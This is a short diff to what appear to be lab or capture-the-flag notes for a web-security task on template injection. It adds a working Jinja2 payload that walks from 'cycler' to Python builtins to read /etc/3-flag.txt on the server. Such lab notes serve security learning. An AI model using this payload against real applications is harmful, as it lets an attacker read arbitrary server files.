@@ -17,4 +17,4 @@ WIP
 		- Put {{5*5}} inside it to test Jinja2
 		- Check output at http://web0x07.hbtn/task3/list_file
 	- Create a Jinja2 payload to show file /etc/3-flag.txt
-	- Payload: 
+	- Payload: {{ cycler.__init__.__globals__['__builtins__']['open']('/etc/3-flag.txt').read() }} 
